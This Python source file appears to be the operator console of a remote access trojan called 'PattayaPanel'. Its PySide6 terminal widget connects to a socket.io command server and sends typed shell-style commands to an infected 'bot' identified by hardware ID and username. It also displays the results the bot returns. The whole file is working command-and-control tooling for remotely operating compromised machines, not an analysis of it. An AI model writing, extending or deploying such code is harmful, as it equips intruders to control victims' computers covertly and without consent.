from PySide6.QtWidgets import QWidget,QCompleter
from PySide6.QtGui import QIcon,QFont
from PySide6.QtCore import Qt
from core.util import PattayaPanelUtil
from designer.ui_terminal import Ui_BotTerminalWidget
import json
from datetime import datetime
import socketio


class BotTerminalWidget(QWidget, Ui_BotTerminalWidget):
    def __init__(self, bot, url, token, namespace):
        super().__init__()        
        self.setupUi(self)
        self.bot = bot
        self.url = url
        self.token = token
        self.namespace = namespace
        self.socket_io_client = socketio.Client()
        try:
            self.socket_io_client.connect(self.url, headers={'Authorization': f'###### {token}', 'Content-Type': 'application/json'}, namespaces=self.namespace)
            self.update_bot_terminal("Terminal has been initialized connection")
        except Exception as e:
            self.update_bot_terminal(f'{str(e)}')

        self.socket_io_client.on('disconnect', self._on_disconnect)
        self.bot_event = f'panel_terminal_bot_task_result_{self.bot["hwid"]}'
        self.socket_io_client.on(self.bot_event, self.server_update_bot_terminal)

        self.setWindowIcon(QIcon(":/assets/images/rat.png"))
        self.task_result_text_browser.setStyleSheet("background-color: #000000;")
        self.bot_send_task_line_edit.setStyleSheet("background-color: #000000;")
        self.bot_send_task_line_edit.setStyleSheet("color: #FB00FF;")


        # command = ['help', 'cd', 'pwd', 'mkdir', 'start']
        # completer = QCompleter(command)
        # self.bot_send_task_line_edit.setCompleter(completer)

        self.setWindowFlags(Qt.WindowType.WindowStaysOnTopHint)
        self.bot_send_task_line_edit.returnPressed.connect(self.handle_bot_comamnd)


        font = QFont()
        font.setPointSize(11)  # set the font size to 20
        self.task_result_text_browser.setFont(font)

        
        self.task_result_text_browser.setFocusPolicy(Qt.FocusPolicy.NoFocus)

    def handle_bot_comamnd(self):
        text = self.bot_send_task_line_edit.text()
        if text == '':
            return
        
        PattayaPanelUtil.panel_log_info(f"Enter {text} command to {self.bot['username']}")
        self.update_bot_terminal(text)
        args = text.split(" ", 1)
        command = args[0]

        if (len(args)) == 1:
            arg = ""
        else:
            arg = args[1]

        bot_task = {
            "socketId": self.bot['socketId'],
            "hwid": self.bot['hwid'],
            "command": command,
            "arguments": arg,
            "file": "" 
        }
        try:
            self.socket_io_client.emit('panel_send_bot_task', bot_task)
        except Exception as e:
            self.update_bot_terminal(f'{str(e)}')

        
        self.bot_send_task_line_edit.clear()
        self.bot_send_task_line_edit.setDisabled(True)


    def closeEvent(self, event):
        # self.socket_io_client.socket_io.off(self.bot_event)
        self.socket_io_client.disconnect()
        PattayaPanelUtil.terminals.pop(self.bot['hwid'])
        PattayaPanelUtil.panel_log_info(f"Closed {self.bot['username']} terminal")
    
    
    def server_update_bot_terminal(self, text):
        self.bot_send_task_line_edit.setDisabled(False)
        self.bot_send_task_line_edit.setFocus()
        current_time = datetime.now()
        formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
        self.task_result_text_browser.append(f"<font color='#F600FA'>[*] [{formatted_time}] {text['message']}</font><br>")
        self.task_result_text_browser.ensureCursorVisible()

    def update_bot_terminal(self, command):
        current_time = datetime.now()
        formatted_time = current_time.strftime('%d:%m:%Y %H:%M:%S')
        self.task_result_text_browser.append(f"<font color='#2AFA00'>[+] [{formatted_time}] Tasking bot [{self.bot['username']}]</font><font color='#F6FA00'>>>></font></font><font color='#00E3FA'> {command}</font>")
        self.task_result_text_browser.ensureCursorVisible()


    def _on_disconnect(self):
        self.update_bot_terminal("Terminal has been disconnected")

